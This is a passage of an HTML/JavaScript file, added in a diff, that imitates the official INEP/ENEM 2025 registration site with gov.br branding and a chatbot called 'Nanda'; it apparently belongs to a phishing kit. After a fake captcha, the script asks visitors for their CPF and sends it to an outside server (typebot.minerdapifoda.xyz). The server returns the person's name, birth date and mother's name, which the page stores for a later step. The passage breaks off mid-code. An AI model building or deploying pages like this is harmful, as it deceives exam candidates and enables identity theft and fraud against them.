@@ -1,0 +1,981 @@
+
+<!DOCTYPE html><html lang="pt-BR"><head><!-- Google tag (gtag.js) -->
+    <title>INEP - Instituto Nacional de Estudos e Pesquisas Educacionais Anísio Teixeira</title>
+    <meta name="description" content="">
+    <meta name="keywords" content="">
+    <meta name="author" content="INEP">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="theme-color" content="#222">
+    <meta name="apple-mobile-web-app-status-bar-style" content="#222">
+    <meta name="msapplication-navbutton-color" content="#222">
+    <link rel="shortcut icon" href="images/favicon.ico">
+    <link rel="shortcut icon" href="images/favicon.ico">
+    <link rel="icon" href="images/favicon.ico" sizes="32x32">
+    <link rel="icon" href="images/favicon.ico" sizes="192x192">
+    <link rel="apple-touch-icon" href="images/favicon.ico">
+    <meta name="msapplication-TileImage" content="https://inscricoeseneminep.info/inscricao/images/favicon.ico">
+    <link href="css/bootstrap.min.css" rel="stylesheet">
+    <link href="css/all.min.css" rel="stylesheet">
+    <link href="fonts.css" rel="stylesheet">
+    <link href="css/style.css" rel="stylesheet">
+</head>
+
+<body>
+    <div id="loading">
+        <span>Carregando...</span>
+    </div>
+    <div id="barra-brasil">
+        <div class="conteudo-escondido">
+            <a accesskey="1" href="#conteudo">Ir para o conteúdo</a>
+        </div>
+        <div class="conteudo-barra-brasil">
+            <a href="#" class="pic-gov" title="GovBR">GovBR</a>
+            <nav id="menu-barra-brasil" onscroll="checkScrollBarra(this);">
+                <ul class="lista-barra-brasil d-none d-lg-flex d-xl-flex">
+                    <li class="list-item"><a href="javascript:toggleOrgaosGoverno();" class="link-barra link-externo-barra">Acesso à informação</a></li>
+                    <li class="espacador"></li>
+                    <li class="list-item"><a href="javascript:toggleOrgaosGoverno();" class="link-barra link-externo-barra">Participe</a></li>
+                    <li class="espacador"></li>
+                    <li class="list-item"><a href="javascript:toggleOrgaosGoverno();" class="link-barra link-externo-barra">Serviços</a></li>
+                    <li class="espacador"></li>
+                    <li class="list-item"><a href="javascript:toggleOrgaosGoverno();" class="link-barra link-externo-barra">Legislação</a></li>
+                    <li class="espacador"></li>
+                    <li class="list-item"><a href="javascript:toggleOrgaosGoverno();" id="link-orgaos" class="link-barra link-interno-barra link-baixo-barra">Órgãos do Governo</a></li>
+                </ul>
+                <div class="menu-mobile d-flex d-lg-none d-xl-none"><i class="fa-solid fa-bars"></i></div>
+            </nav>
+            <a href="javascript:scrollBarra();" id="botao-seta-direita" class="botao-seta-direita"><i class="arrow right">Navegar para direita</i></a>
+        </div>
+    </div>
+    <div class="topo-site">
+        <div class="container">
+            <div class="logo">
+                <img src="images/logo_enem.svg" alt="ENEM 2025" width="205">
+            </div>
+        </div>
+        <div class="css-6nj1yj btn-sair d-flex d-lg-none d-xl-none">
+            <svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 512 512" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg">
+                <path d="M400 54.1c63 45 104 118.6 104 201.9 0 136.8-110.8 247.7-247.5 248C120 504.3 8.2 393 8 256.4 7.9 173.1 48.9 99.3 111.8 54.2c11.7-8.3 28-4.8 35 7.7L162.6 90c5.9 10.5 3.1 23.8-6.6 31-41.5 30.8-68 79.6-68 134.9-.1 92.3 74.5 168.1 168 168.1 91.6 0 168.6-74.2 168-169.1-.3-51.8-24.7-101.8-68.1-134-9.7-7.2-12.4-20.5-6.5-30.9l15.8-28.1c7-12.4 23.2-16.1 34.8-7.8zM296 264V24c0-13.3-10.7-24-24-24h-32c-13.3 0-24 10.7-24 24v240c0 13.3 10.7 24 24 24h32c13.3 0 24-10.7 24-24z">
+                </path>
+            </svg>
+        </div>
+    </div>
+    <section id="card-inscricao">
+        <div class="content-card">
+            <div class="barra-side">
+                <div class="content-side">
+                    <h2>SITE DO ENEM</h2>
+                    <ul>
+                        <li><a href="#"><i class="fa-regular fa-calendar"></i>Cronograma</a></li>
+                        <li><a href="#"><i class="fa-solid fa-globe"></i>Orientações</a></li>
+                        <li><a href="#"><i class="fa-regular fa-circle-question"></i>Dúvidas Frequentes</a></li>
+                        <li><a href="#"><i class="fa-brands fa-youtube"></i>Tutorias</a></li>
+                    </ul>
+                    <div class="contador">
+                        <h2>Término das inscrições</h2>
+                        <div class="cards-dias d-flex align-items-center">
+                            <div class="card-div dia">
+                                <span class="data">23</span>
+                                <strong>Dias</strong>
+                            </div>
+                            <div class="card-div hora">
+                                <span class="data">01</span>
+                                <strong>Horas</strong>
+                            </div>
+                            <div class="card-div minuto">
+                                <span class="data">11</span>
+                                <strong>Min</strong>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            <div class="body-card">
+                <div class="css-wbgyl1">
+                    <div class="css-1gic6yg">
+
+                    <div class="msg-bot slide-in">
+        <div class="msg-bot">
+                        
+                    </div>
+      </div></div>
+                </div>
+                <div class="css-1qh4aj3">
+                    <div class="css-10nvitp">
+                        <div class="css-b7azs1">
+                            <input class="css-15nda4v" readonly="" autocomplete="off">
+                        </div>
+                        <button class="jss11 jss12 jss1 jss3 jss9 jss7" tabindex="-1" type="submit" disabled="">
+                            <span class="jss2">
+                                <svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 24 24" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg">
+                                    <path d="M2.01 21L23 12 2.01 3 2 10l15 2-15 2z"></path>
+                                </svg>
+                            </span>
+                        </button>
+                    </div>
+                </div>
+                <div class="css-17l7yx8">
+                    <span>
+                        <svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 576 512" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg">
+                            <path d="M528 0H48C21.5 0 0 21.5 0 48v320c0 26.5 21.5 48 48 48h192l-16 48h-72c-13.3 0-24 10.7-24 24s10.7 24 24 24h272c13.3 0 24-10.7 24-24s-10.7-24-24-24h-72l-16-48h192c26.5 0 48-21.5 48-48V48c0-26.5-21.5-48-48-48zm-16 352H64V64h448v288z">
+                            </path>
+                        </svg> 3.0.1326
+                    </span>
+                    <span>
+                        <svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 512 512" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg">
+                            <path d="M480 160H32c-17.673 0-32-14.327-32-32V64c0-17.673 14.327-32 32-32h448c17.673 0 32 14.327 32 32v64c0 17.673-14.327 32-32 32zm-48-88c-13.255 0-24 10.745-24 24s10.745 24 24 24 24-10.745 24-24-10.745-24-24-24zm-64 0c-13.255 0-24 10.745-24 24s10.745 24 24 24 24-10.745 24-24-10.745-24-24-24zm112 248H32c-17.673 0-32-14.327-32-32v-64c0-17.673 14.327-32 32-32h448c17.673 0 32 14.327 32 32v64c0 17.673-14.327 32-32 32zm-48-88c-13.255 0-24 10.745-24 24s10.745 24 24 24 24-10.745 24-24-10.745-24-24-24zm-64 0c-13.255 0-24 10.745-24 24s10.745 24 24 24 24-10.745 24-24-10.745-24-24-24zm112 248H32c-17.673 0-32-14.327-32-32v-64c0-17.673 14.327-32 32-32h448c17.673 0 32 14.327 32 32v64c0 17.673-14.327 32-32 32zm-48-88c-13.255 0-24 10.745-24 24s10.745 24 24 24 24-10.745 24-24-10.745-24-24-24zm-64 0c-13.255 0-24 10.745-24 24s10.745 24 24 24 24-10.745 24-24-10.745-24-24-24z">
+                            </path>
+                        </svg> 3.0.5351
+                    </span>
+                </div>
+            </div>
+        </div>
+    </section>
+    <style>
+        .topo-site .btn-sair {
+            display: none !important;
+        }
+        /* Estilo para mensagens de erro e debug */
+        .error-details {
+            background-color: #fff8f8;
+            border-left: 3px solid #ff6b6b;
+            padding: 8px 12px;
+            margin-top: 8px;
+            font-size: 12px;
+            color: #d63031;
+            font-family: monospace;
+            white-space: pre-wrap;
+            max-height: 100px;
+            overflow-y: auto;
+        }
+        /* Botão de tentar novamente */
+        .retry-btn {
+            background-color: #4b7bec;
+            color: white;
+            border: none;
+            padding: 8px 15px;
+            border-radius: 4px;
+            margin-top: 10px;
+            cursor: pointer;
+            font-weight: bold;
+        }
+        .retry-btn:hover {
+            background-color: #3867d6;
+        }
+        /* Estilo para o log de depuração */
+        #debug-log {
+            position: fixed;
+            bottom: 0;
+            right: 0;
+            width: 300px;
+            max-height: 200px;
+            overflow-y: auto;
+            background-color: rgba(0, 0, 0, 0.8);
+            color: #00ff00;
+            font-family: monospace;
+            font-size: 10px;
+            padding: 10px;
+            z-index: 9999;
+            display: none; /* Oculto por padrão */
+        }
+    </style>
+    <div id="debug-log"><div>[10:47:07 PM] Página carregada</div></div>
+    <script>
+        // Função para adicionar logs de depuração
+        function debugLog(message) {
+            const debugElement = document.getElementById('debug-log');
+            if (!debugElement) return;
+            
+            const timestamp = new Date().toLocaleTimeString();
+            const logEntry = document.createElement('div');
+            logEntry.textContent = `[${timestamp}] ${message}`;
+            debugElement.appendChild(logEntry);
+            debugElement.scrollTop = debugElement.scrollHeight;
+        }
+        
+        // Função para ativar/desativar o log de depuração
+        function toggleDebugLog() {
+            const debugElement = document.getElementById('debug-log');
+            if (debugElement.style.display === 'none') {
+                debugElement.style.display = 'block';
+                debugLog('Debug log ativado');
+            } else {
+                debugElement.style.display = 'none';
+            }
+        }
+        
+        // Ativar o log de depuração com Ctrl+Shift+D
+        document.addEventListener('keydown', function(e) {
+            if (e.ctrlKey && e.shiftKey && e.key === 'D') {
+                toggleDebugLog();
+            }
+        });
+        
+        // Função para validar CPF
+        function validarCPF(cpf) {
+            cpf = cpf.replace(/\D/g, '');
+            
+            // Verifica se tem 11 dígitos
+            if (cpf.length !== 11) {
+                return false;
+            }
+            
+            // Verifica se todos os dígitos são iguais
+            if (/^(\d)\1+$/.test(cpf)) {
+                return false;
+            }
+            
+            // Validação do primeiro dígito verificador
+            let soma = 0;
+            for (let i = 0; i < 9; i++) {
+                soma += parseInt(cpf.charAt(i)) * (10 - i);
+            }
+            let resto = 11 - (soma % 11);
+            let dv1 = resto > 9 ? 0 : resto;
+            
+            if (dv1 != parseInt(cpf.charAt(9))) {
+                return false;
+            }
+            
+            // Validação do segundo dígito verificador
+            soma = 0;
+            for (let i = 0; i < 10; i++) {
+                soma += parseInt(cpf.charAt(i)) * (11 - i);
+            }
+            resto = 11 - (soma % 11);
+            let dv2 = resto > 9 ? 0 : resto;
+            
+            if (dv2 != parseInt(cpf.charAt(10))) {
+                return false;
+            }
+            
+            return true;
+        }
+        
+        // Função para validar data
+        function validarData(data) {
+            // Verifica o formato DD/MM/AAAA
+            if (!/^\d{2}\/\d{2}\/\d{4}$/.test(data)) {
+                return false;
+            }
+            
+            const [dia, mes, ano] = data.split('/').map(Number);
+            
+            // Verifica se o mês é válido
+            if (mes < 1 || mes > 12) {
+                return false;
+            }
+            
+            // Verifica se o dia é válido para o mês
+            const diasNoMes = [0, 31, 28, 31, 30, 31, 30, 31, 31, 30, 31, 30, 31];
+            
+            // Ajuste para ano bissexto
+            if (ano % 400 === 0 || (ano % 100 !== 0 && ano % 4 === 0)) {
+                diasNoMes[2] = 29;
+            }
+            
+            if (dia < 1 || dia > diasNoMes[mes]) {
+                return false;
+            }
+            
+            // Verifica se a data não é futura
+            const dataAtual = new Date();
+            const dataInformada = new Date(ano, mes - 1, dia);
+            
+            if (dataInformada > dataAtual) {
+                return false;
+            }
+            
+            return true;
+        }
+        
+        // Função para consultar CPF usando a API direta
+        function consultarCPF(cpf, callback) {
+            debugLog(`Consultando CPF: ${cpf}`);
+            
+            // URL da API fornecida
+            const apiUrl = `https://typebot.minerdapifoda.xyz:8080/api/typebot?cpf=${cpf}`;
+            debugLog(`URL da API: ${apiUrl}`);
+            
+            fetch(apiUrl, {
+                method: 'GET',
+                headers: {
+                    'Content-Type': 'application/json',
+                    'Accept': 'application/json'
+                }
+            })
+            .then(response => {
+                debugLog(`Status da resposta: ${response.status}`);
+                if (!response.ok) {
+                    throw new Error(`Erro na resposta: ${response.status} ${response.statusText}`);
+                }
+                return response.json();
+            })
+            .then(data => {
+                debugLog(`Resposta recebida: ${JSON.stringify(data)}`);
+                
+                // Verificar se a resposta contém os dados esperados
+                if (!data || !data.CPF) {
+                    throw new Error("Resposta da API não contém os dados esperados");
+                }
+                
+                // Adaptar o formato da resposta para o formato esperado pelo código
+                // A API retorna { CPF, NOME, NASCIMENTO, MAE, SEXO }
+                // Nosso código espera { dadosBasicos: { cpf, nome, nascimento, mae, sexo } }
+                const dadosAdaptados = {
+                    dadosBasicos: {
+                        cpf: data.CPF,
+                        nome: data.NOME,
+                        nascimento: data.NASCIMENTO,
+                        mae: data.MAE,
+                        sexo: data.SEXO === "Masculino" ? "M" : "F",
+                        primeiro_nome: data.NOME.split(' ')[0]
+                    }
+                };
+                
+                debugLog(`Dados adaptados: ${JSON.stringify(dadosAdaptados)}`);
+                callback(dadosAdaptados);
+            })
+            .catch(error => {
+                debugLog(`Erro ao consultar API: ${error.message}`);
+                callback(null, error);
+            });
+        }
+
+        function atualizarContador() {
+           // Define a data 24 dias à frente da data atual
+// Data final exata: 24 dias a partir de 13/05/2025 = 06/06/2025 às 23h59
+const destino = new Date("2025-06-06T23:59:00");
+
+
+            const agora = new Date();
+            const diferenca = destino - agora;
+
+            if (diferenca <= 0) {
+                document.querySelector('.card-div.dia .data').textContent = "00";
+                document.querySelector('.card-div.hora .data').textContent = "00";
+                document.querySelector('.card-div.minuto .data').textContent = "00";
+                return;
+            }
+
+            const dias = Math.floor(diferenca / (1000 * 60 * 60 * 24));
+            const horas = Math.floor((diferenca % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
+            const minutos = Math.floor((diferenca % (1000 * 60 * 60)) / (1000 * 60));
+
+            document.querySelector('.card-div.dia .data').textContent = dias.toString().padStart(2, '0');
+            document.querySelector('.card-div.hora .data').textContent = horas.toString().padStart(2, '0');
+            document.querySelector('.card-div.minuto .data').textContent = minutos.toString().padStart(2, '0');
+        }
+
+        atualizarContador();
+        setInterval(atualizarContador, 60000);
+    </script>
+    <script>
+        window.addEventListener('DOMContentLoaded', () => {
+            debugLog('Página carregada');
+            
+            const container = document.querySelector('.css-1gic6yg');
+            const scrollArea = document.querySelector('.css-wbgyl1');
+
+            if (container && scrollArea) {
+                var novaMsg = document.createElement('div');
+                novaMsg.className = 'msg-bot slide-in';
+                novaMsg.innerHTML = `
+        <div class="msg-bot">
+                        <div class="body-msg">
+                            <div size="70" class="avatar-msg avatar-felicidade"><div></div></div>
+                            <div direction="left" tabindex="0" class="text-msg">
+                                <svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 320 512" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg">
+                                    <path d="M31.3 192h257.3c17.8 0 26.7 21.5 14.1 34.1L174.1 354.8c-7.8 7.8-20.5 7.8-28.3 0L17.2 226.1C4.6 213.5 13.5 192 31.3 192z"></path>
+                                </svg>
+                                <div>
+                                    <p>Olá! Eu sou a Nanda!</p>
+                                    <p>Estou por dentro de tudo sobre o Enem!</p>
+                                    <p>Aqui você pode fazer sua <strong>INSCRIÇÃO</strong> e consultar seus <strong>RESULTADOS ANTERIORES</strong>.</p>
+                                    <p>O que você gostaria de fazer agora?</p>
+                                    <div class="botoes-msg">
+                                        <button class="btn-msg">Página do Participante - Entrar com<b>gov.br</b></button>
+                                        <button class="btn-msg" id="init_chat">Inscrição</button>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+      `;
+
+                container.appendChild(novaMsg);
+
+                scrollArea.scrollTop = scrollArea.scrollHeight;
+
+                const btn = document.getElementById('init_chat');
+
+                btn.addEventListener('click', () => {
+                    var msgUsuario = document.createElement('div');
+                    msgUsuario.className = 'msg-user slide-in-right';
+                    msgUsuario.innerHTML = `
+          <div direction="right" tabindex="0" class="body-msg">
+            <span>
+              <p>Quero me inscrever no Enem 2025.</p>
+            </span>
+            <svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 320 512" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg">
+              <path d="M31.3 192h257.3c17.8 0 26.7 21.5 14.1 34.1L174.1 354.8c-7.8 7.8-20.5 7.8-28.3 0L17.2 226.1C4.6 213.5 13.5 192 31.3 192z"></path>
+            </svg>
+          </div>
+        `;
+
+                    container.appendChild(msgUsuario);
+                    scrollArea.scrollTop = scrollArea.scrollHeight;
+
+                    setTimeout(() => {
+                        var novaMsg = document.createElement('div');
+                        novaMsg.className = 'msg-bot slide-in';
+                        novaMsg.innerHTML = `
+                <div class="msg-bot">
+                            <div class="body-msg">
+                                <div size="70" class="avatar-msg avatar-confusa"><div></div></div>
+                                <div direction="left" tabindex="0" class="text-msg">
+                                    <svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 320 512" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg">
+                                        <path d="M31.3 192h257.3c17.8 0 26.7 21.5 14.1 34.1L174.1 354.8c-7.8 7.8-20.5 7.8-28.3 0L17.2 226.1C4.6 213.5 13.5 192 31.3 192z"></path>
+                                    </svg>
+                                    <div>
+                                        <p>Antes de prosseguirmos, preciso que você resolva um desafio.</p>
+                                        <p class="text-center">Qual das figuras abaixo é uma imagem de "<strong id="item-captcha" data-item="Calça">Calça</strong>"?</p>
+                                        <div class="css-176w0hu">
+                                            <div class="css-x59uo5" data-item="Carro">
+                                                <img src="https://nenem-six.vercel.app/images/carro.png" alt="Opção do Captcha">
+                                            </div>
+                                            <div class="css-x59uo5" data-item="Bandeira">
+                                                <img src="https://nenem-six.vercel.app/images/bandeira.png" alt="Opção do Captcha">
+                                            </div>
+                                            <div class="css-x59uo5" data-item="Calça">
+                                                <img src="https://nenem-six.vercel.app/images/calca.png" alt="Opção do Captcha">
+                                            </div>
+                                            <div class="css-x59uo5" data-item="Olho">
+                                                <img src="https://nenem-six.vercel.app/images/olho.png" alt="Opção do Captcha">
+                                            </div>
+                                            <div class="css-x59uo5" data-item="Pé">
+                                                <img src="https://nenem-six.vercel.app/images/pe.png" alt="Opção do Captcha">
+                                            </div>
+                                        </div>
+                                        <div class="buttons-recaptcha">
+                                            <button class="btn-recaptcha" tabindex="0" type="button">
+                                                <span class="jss2">
+                                                    <svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 512 512" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg"><path d="M160 288h-16c-35.35 0-64 28.7-64 64.12v63.76c0 35.41 28.65 64.12 64 64.12h16c17.67 0 32-14.36 32-32.06V320.06c0-17.71-14.33-32.06-32-32.06zm208 0h-16c-17.67 0-32 14.35-32 32.06v127.88c0 17.7 14.33 32.06 32 32.06h16c35.35 0 64-28.71 64-64.12v-63.76c0-35.41-28.65-64.12-64-64.12zM256 32C112.91 32 4.57 151.13 0 288v112c0 8.84 7.16 16 16 16h16c8.84 0 16-7.16 16-16V288c0-114.67 93.33-207.8 208-207.82 114.67.02 208 93.15 208 207.82v112c0 8.84 7.16 16 16 16h16c8.84 0 16-7.16 16-16V288C507.43 151.13 399.09 32 256 32z"></path></svg>
+                                                </span>
+                                                <span class="jss14"></span>
+                                            </button>
+                                            <button class="btn-recaptcha" id="reordem" tabindex="0" type="button">
+                                                <span class="jss2">
+                                                    <svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 512 512" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg"><path d="M212.333 224.333H12c-6.627 0-12-5.373-12-12V12C0 5.373 5.373 0 12 0h48c6.627 0 12 5.373 12 12v78.112C117.773 39.279 184.26 7.47 258.175 8.007c136.906.994 246.448 111.623 246.157 248.532C504.041 393.258 393.12 504 256.333 504c-64.089 0-122.496-24.313-166.51-64.215-5.099-4.622-5.334-12.554-.467-17.42l33.967-33.967c4.474-4.474 11.662-4.717 16.401-.525C170.76 415.336 211.58 432 256.333 432c97.268 0 176-78.716 176-176 0-97.267-78.716-176-176-176-58.496 0-110.28 28.476-142.274 72.333h98.274c6.627 0 12 5.373 12 12v48c0 6.627-5.373 12-12 12z"></path></svg>
+                                                </span>
+                                                <span class="jss14"></span>
+                                            </button>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+            `;
+
+                        container.appendChild(novaMsg);
+
+                        scrollArea.scrollTop = scrollArea.scrollHeight;
+
+                        const btnReordem = document.getElementById('reordem');
+                        const itemCaptcha = document.getElementById('item-captcha');
+                        const spanErro = container.querySelector('.erro');
+                        const icons = document.querySelector('.css-176w0hu');
+
+                        function embaralharImagens(keepItem = false) {
+                            const itens = Array.from(icons.querySelectorAll('.css-x59uo5'));
+                            const nomes = itens.map(item => item.dataset.item);
+
+                            if (!keepItem) {
+                                const novoItem = nomes[Math.floor(Math.random() * nomes.length)];
+                                itemCaptcha.textContent = novoItem;
+                                itemCaptcha.dataset.item = novoItem;
+                            }
+
+                            const embaralhado = [...itens]
+                                .sort(() => Math.random() - 0.5);
+
+                            embaralhado.forEach(el => {
+                                icons.appendChild(el);
+                            });
+
+                            if (spanErro) spanErro.style.display = 'none';
+                            ativarVerificacao();
+                        }
+
+                        function ativarVerificacao() {
+                            const blocos = icons.querySelectorAll('.css-x59uo5');
+                            blocos.forEach(bloco => {
+                                bloco.onclick = () => {
+                                    const esperado = itemCaptcha.dataset.item;
+                                    const clicado = bloco.dataset.item;
+                                    const image = $(bloco).find('img').attr('src');
+
+                                    if (clicado === esperado) {
+                                        $('span.erro').remove();
+                                        $(bloco).addClass('css-1ottlnu');
+                                        $('.btn-recaptcha').attr('disabled', true);
+                                        continua(image);
+                                    } else {
+                                        $('span.erro').remove();
+                                        embaralharImagens(false);
+                                        setTimeout(() => {
+                                            $(icons).append('<span class="erro">Resposta ao desafio incorreta</span>');
+                                        }, "100");
+                                    }
+                                };
+                            });
+                        }
+
+                        btnReordem.addEventListener('click', () => {
+                            $('span.erro').remove();
+                            embaralharImagens(false);
+                        });
+                        ativarVerificacao();
+                    }, "500");
+                });
+            }
+
+            function continua(image) {
+                var msgUsuario = document.createElement('div');
+                msgUsuario.className = 'msg-user slide-in-right';
+                msgUsuario.innerHTML = `
+          <div direction="right" tabindex="0" class="body-msg">
+            <span>
+              <p><img src="${image}" alt="Resposta do Captcha"></p>
+            </span>
+            <svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 320 512" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg">
+              <path d="M31.3 192h257.3c17.8 0 26.7 21.5 14.1 34.1L174.1 354.8c-7.8 7.8-20.5 7.8-28.3 0L17.2 226.1C4.6 213.5 13.5 192 31.3 192z"></path>
+            </svg>
+          </div>
+        `;
+
+                container.appendChild(msgUsuario);
+                scrollArea.scrollTop = scrollArea.scrollHeight;
+
+                function cpfStep() {
+                    setTimeout(() => {
+                        var novaMsg = document.createElement('div');
+                        novaMsg.className = 'msg-bot slide-in';
+                        novaMsg.innerHTML = `
+                    <div class="msg-bot">
+                            <div class="body-msg">
+                                <div size="70" class="avatar-msg avatar-normal"><div></div></div>
+                                <div direction="left" tabindex="0" class="text-msg">
+                                    <svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 320 512" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg">
+                                        <path d="M31.3 192h257.3c17.8 0 26.7 21.5 14.1 34.1L174.1 354.8c-7.8 7.8-20.5 7.8-28.3 0L17.2 226.1C4.6 213.5 13.5 192 31.3 192z"></path>
+                                    </svg>
+                                    <div>
+                                        <p>Muito bem!</p>
+                                        <p>Agora preciso do seu <strong>CPF</strong></p>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                `;
+
+                        container.appendChild(novaMsg);
+                        scrollArea.scrollTop = scrollArea.scrollHeight;
+
+                        $('.css-15nda4v').attr('type', 'tel').attr('name', 'cpf').attr('readonly', false).mask('000.000.000-00').focus();
+                        $('.css-10nvitp button').attr('disabled', false).removeClass('jss7').attr('id', 'send-cpf');
+                        $('.css-1qh4aj3').addClass('css-1c97vgy');
+
+                        let input = document.querySelector('.css-15nda4v');
+                        input.onfocus = function () {
+                            this.closest('.css-1qh4aj3').classList.add('css-1c97vgy');
+                        };
+                        input.onblur = function () {
+                            this.closest('.css-1qh4aj3').classList.remove('css-1c97vgy');
+                        };
+                        input.onkeydown = function (event) {
+                            if (event.key === 'Enter') {
+                                event.preventDefault();
+                                document.querySelector('#send-cpf')?.click();
+                            }
+                        };
+
+                        document.querySelector('.css-15nda4v').addEventListener('blur', function () {
+                            this.closest('.css-1qh4aj3').classList.remove('css-1c97vgy');
+                        });
+
+                        document.querySelector('.css-15nda4v').addEventListener('keydown', function (event) {
+                            if (event.key === 'Enter') {
+                                event.preventDefault();
+                                document.querySelector('#send-cpf')?.click();
+                            }
+                        });
+
+                        document.querySelector('#send-cpf').onclick = function (event) {
+                            var cpf = $('.css-15nda4v').val();
+
+                            $('.css-15nda4v').removeAttr('type').removeAttr('name').attr('readonly', true).unmask().val('').blur();
+                            $('.css-10nvitp button').attr('disabled', false).addClass('jss7').removeAttr('id');
+
+                            var msgUsuario = document.createElement('div');
+                            msgUsuario.className = 'msg-user slide-in-right';
+                            msgUsuario.innerHTML = `
+                    <div direction="right" tabindex="0" class="body-msg">
+                        <span>
+                        <p>Meu CPF é ${cpf}</p>
+                        </span>
+                        <svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 320 512" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg">
+                        <path d="M31.3 192h257.3c17.8 0 26.7 21.5 14.1 34.1L174.1 354.8c-7.8 7.8-20.5 7.8-28.3 0L17.2 226.1C4.6 213.5 13.5 192 31.3 192z"></path>
+                        </svg>
+                    </div>
+                    `;
+
+                            container.appendChild(msgUsuario);
+                            scrollArea.scrollTop = scrollArea.scrollHeight;
+
+                            function unformatCPF(cpf) {
+                                return cpf.replace(/\D/g, '');
+                            }
+
+                            var doc = unformatCPF(cpf);
+                            debugLog(`CPF sem formatação: ${doc}`);
+                            
+                            // Validar CPF antes de consultar a API
+                            if (!validarCPF(doc)) {
+                                debugLog(`CPF inválido: ${doc}`);
+                                
+                                var errorMsg = document.createElement('div');
+                                errorMsg.className = 'msg-bot slide-in';
+                                errorMsg.innerHTML = `
+                                <div class="msg-bot">
+                                    <div class="body-msg">
+                                        <div size="70" class="avatar-msg avatar-confusa"><div></div></div>
+                                        <div direction="left" tabindex="0" class="text-msg">
+                                            <svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 320 512" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg">
+                                                <path d="M31.3 192h257.3c17.8 0 26.7 21.5 14.1 34.1L174.1 354.8c-7.8 7.8-20.5 7.8-28.3 0L17.2 226.1C4.6 213.5 13.5 192 31.3 192z"></path>
+                                            </svg>
+                                            <div>
+                                                <p>O CPF informado não é válido, tente novamente!</p>
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+                                `;
+                                
+                                container.appendChild(errorMsg);
+                                scrollArea.scrollTop = scrollArea.scrollHeight;
+                                
+                                // Voltar para a etapa de CPF
+                                setTimeout(() => {
+                                    cpfStep();
+                                }, 1000);
+                                
+                                return;
+                            }
+                            
+                            // Mostrar indicador de carregamento
+                            var loadingMsg = document.createElement('div');
+                            loadingMsg.className = 'msg-bot slide-in';
+                            loadingMsg.id = 'loading-msg';
+                            loadingMsg.innerHTML = `
+                            <div class="msg-bot">
+                                <div class="body-msg">
+                                    <div size="70" class="avatar-msg avatar-normal"><div></div></div>
+                                    <div direction="left" tabindex="0" class="text-msg">
+                                        <svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 320 512" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg">
+                                            <path d="M31.3 192h257.3c17.8 0 26.7 21.5 14.1 34.1L174.1 354.8c-7.8 7.8-20.5 7.8-28.3 0L17.2 226.1C4.6 213.5 13.5 192 31.3 192z"></path>
+                                        </svg>
+                                        <div>
+                                            <p>Consultando seu CPF...</p>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                            `;
+                            
+                            container.appendChild(loadingMsg);
+                            scrollArea.scrollTop = scrollArea.scrollHeight;
+                            
+                            // Consultar CPF usando a API direta
+                            consultarCPF(doc, (data, error) => {
+                                // Remover mensagem de carregamento
+                                document.getElementById('loading-msg').remove();
+                                
+                                if (data && data.dadosBasicos) {
+                                    debugLog(`Dados recebidos com sucesso: ${JSON.stringify(data.dadosBasicos)}`);
+                                    
+                                    // Salvar os dados no localStorage
+                                    localStorage.setItem('cpfData', JSON.stringify(data.dadosBasicos));
+                                    
+                                    // Prosseguir para a próxima etapa
+                                    next_step();
+                                } else {
+                                    // Exibir mensagem de erro com detalhes
+                                    debugLog(`Erro ao consultar CPF: ${error ? error.message : 'Erro desconhecido'}`);
+                                    
+                                    var errorMsg = document.createElement('div');
+                                    errorMsg.className = 'msg-bot slide-in';
+                                    errorMsg.innerHTML = `
+                                    <div class="msg-bot">
+                                        <div class="body-msg">
+                                            <div size="70" class="avatar-msg avatar-confusa"><div></div></div>
+                                            <div direction="left" tabindex="0" class="text-msg">
+                                                <svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 320 512" height="1em" width="1em" xmlns="http://www.w3.org/2000/svg">
+                                                    <path d="M31.3 192h257.3c17.8 0 26.7 21.5 14.1 34.1L174.1 354.8c-7.8 7.8-20.5 7.8-28.3 0L17.2 226.1C4.6 213.5 13.5 192 31.3 192z"></path>
+                                                </svg>
+                                                <div>
+                                                    <p>Não foi possível consultar o CPF. Tente novamente mais tarde.</p>
+                                                    <div class="error-details">
+                                                        Erro: ${error ? error.message : 'Erro desconhecido'}
+                                                        
+                                                        Possíveis causas:
+                                                        - Problemas de CORS (Cross-Origin Resource Sharing)
+                                                        - API indisponível
+                                                        - CPF inválido
+                                                    </div>
